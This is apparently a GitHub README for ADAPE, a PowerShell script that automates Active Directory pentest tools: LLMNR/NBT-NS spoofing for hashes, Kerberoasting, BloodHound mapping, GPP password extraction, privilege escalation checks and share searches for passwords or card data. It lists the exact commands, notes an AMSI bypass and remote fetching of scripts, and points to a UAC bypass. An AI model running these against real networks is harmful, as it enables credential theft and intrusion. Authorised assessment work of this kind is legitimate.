# Active Directory Assessment and Privilege Escalation Script
![adape](https://github.com/hausec/ADAPE-Script/blob/master/Screenshots/ADAPE.PNG)

I take absolutely no credit for the modules used in this script. Thanks to the original authors for the modules used in this script, credits and links below.

Let's be honest, this is not a red team script. If you're worried about opsec, this script is not for you as it is loud. If you don't want to mess with the hassel of downloading multiple scripts during a pentest or risk assessment, then this might just be for you. In my previous engagements and assessments, I would run a few Powershell scripts that help identify next targets, check for bad group policy settings, AD misconfigs, missing patches, etc. This script combines the ones I used routinely and autoruns the functions I use in those scripts, outputting the results into a zip file. 

This script will do the following:

•	Gather hashes via WPAD, LLMNR, and NBT-NS spoofing

•	Check for GPP password (MS14-025)

•	Gather hashes for accounts via Kerberoast

•	Map out the domain and identify targets via BloodHound

•	Check for privilege escalation methods

•	Search for open SMB shares on the network 

•	Search those shares and other accessible directories for sensitive files and strings (Passwords, PII, or whatever your want, really). By default it's looking for the term "password". If you wanted to search for CVVs for example, you'd just add it next to 'password', e.g. password,cvv 

•	Check patches of systems on the network

•	Search for file servers

•	Search attached shares 

•	Gather the domain policy

This script requires access to Github, as it just pulls the scripts from Github and automates the collection process. There's an AMSI bypass 1-liner in it to bypass AMSI, so if if you think that will get you caught, feel free to comment it out.

Modules used:

Inveigh - https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1

Functions being ran (Changeable in the script): 

	Invoke-Inveigh -ConsoleOutput N -NBNS Y -mDNS Y -HTTPS Y -FileOutput Y -FileOutputDirectory $path -RunTime 5

Switch: -Inv


Kerberoast - https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1

Function being ran:

	Invoke-Kerberoast -OutputFormat Hashcat | Out-File $path\Kerberoast.krb 

Switch: -Kerberoast


Bloodhound - https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.exe

Function being ran:

	Invoke-BloodHound -CollectionMethod All -NoSaveCache -RandomFilenames -Threads 50 -JSONFolder $path

Switch: -Bloodhound


Get-GPPP - https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Get-GPPPassword.ps1

Function being ran: 

	Get-GPP

Switch: -GPP


PowerUp - https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

Function being ran: 

	Invoke-AllChecks | Out-File $path\PrivEsc.txt

Switch: -PrivEsc


PowerView - https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

Functions being ran:

	Invoke-ShareFinder -CheckShareAccess -Threads 80 | Out-File $path\ShareFinder.txt
	
	Get-ExploitableSystem -Verbose | Export-Csv $path\ExploitableSystem.txt
	
	Get-NetFileServer | Out-File $path\FileServers.txt
	
	net share | Out-File $path\NetShare.txt
	
	Get-DomainPolicy | Out-File $path\DomainPolicy.txt
	
Switch: -PView


Or if you want to run all of them

Switch: -All


The script will ask to run as admin, as it requires it. If you do not have admin access, it will only run the privilege escalation and Bloodhound functions. If you're being blocked by UAC, I suggest running a bypass UAC script (https://raw.githubusercontent.com/samratashok/nishang/master/Escalation/Invoke-PsUACme.ps1). 

After running the .ps1, it will create the capture file in the same folder it's being ran in and zips it. If you're running Windows 7 and below it won't zip, so you'll have to do that yourself. At the end of the script, it deletes all the folders it created (except the .zip file, obviously). 

GPP password checking and searching sensitive files takes awhile, so don't be surprised if this script takes a long time to finish depending on the number of domain controllers, open shares, and strings you're searching for. Comment those sections out if they take too long to run. 

Usage:

Set-ExecutionPolicy Bypass 

./ADAPE.ps1 -All

or 

./ADAPE.ps1 -GPP -PView -Kerberoast

etc.